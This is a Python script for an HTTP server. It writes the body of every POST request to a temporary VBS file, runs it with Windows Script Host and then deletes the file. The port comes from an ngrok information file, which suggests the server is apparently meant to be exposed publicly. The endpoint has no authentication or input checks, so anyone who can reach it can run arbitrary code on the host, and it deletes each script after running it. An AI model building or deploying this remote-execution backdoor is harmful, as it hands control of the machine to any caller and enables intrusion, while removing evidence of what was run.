from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import re
import subprocess
import logging

# Set up logging to include debug information
logging.basicConfig(filename='script.log', level=logging.DEBUG)

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            logging.debug(f"Received POST data: {post_data}")

            # Define the path for the temporary VBS file
            vbs_file_path = "temp_script.vbs"

            # Write the POST data to the VBS file
            with open(vbs_file_path, 'w') as vbs_file:
                vbs_file.write(post_data)
            logging.debug(f"Wrote POST data to {vbs_file_path}")
            
            # Run the VBS file
            self.run_vbs_script(vbs_file_path)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Request received')

        except Exception as e:
            logging.error(f"Error handling POST request: {e}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Hello World')
            logging.debug("Handled GET request successfully.")
        except Exception as e:
            logging.error(f"Error handling GET request: {e}")
            self.send_response(500)
            self.end_headers()

    def run_vbs_script(self, vbs_file_path):
        """Execute the VBS script using Windows Script Host."""
        try:
            logging.debug(f"Running VBS script: {vbs_file_path}")
            result = subprocess.run(["wscript.exe", vbs_file_path], check=True, capture_output=True, text=True)
            logging.debug(f"Executed {vbs_file_path} successfully. Output: {result.stdout}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error executing VBS script: {e}")
        finally:
            # Clean up the VBS file after execution
            if os.path.exists(vbs_file_path):
                os.remove(vbs_file_path)
                logging.debug(f"Deleted VBS script: {vbs_file_path}")

def get_port_from_file(file_path):
    try:
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"The file {file_path} does not exist.")
        
        with open(file_path, 'r') as file:
            lines = file.readlines()
        
        port_line = next((line for line in lines if line.startswith('Port:')), None)
        if port_line is None:
            raise ValueError("Port information not found in the file.")
        
        # Extract the port number from the line
        match = re.search(r'localhost:(\d+)', port_line)
        if match:
            port = int(match.group(1))
            logging.debug(f"Port found in file: {port}")
            return port
        else:
            raise ValueError("Port number not found in the port line.")

    except Exception as e:
        logging.error(f"Error retrieving port from file: {e}")
        raise

def run(server_class=HTTPServer, handler_class=RequestHandler, port=None):
    try:
        if port is None:
            raise ValueError("Port must be provided.")
        
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
        logging.debug(f'Starting HTTP server on port {port}...')
        httpd.serve_forever()
    except Exception as e:
        logging.error(f"Error starting HTTP server: {e}")
        raise

if __name__ == "__main__":
    try:
        ngrok_info_path = './ngrok_information.txt'
        port = get_port_from_file(ngrok_info_path)
        run(port=port)
    except Exception as e:
        logging.error(f"Fatal error in main execution: {e}")

    input("Press Enter to exit...")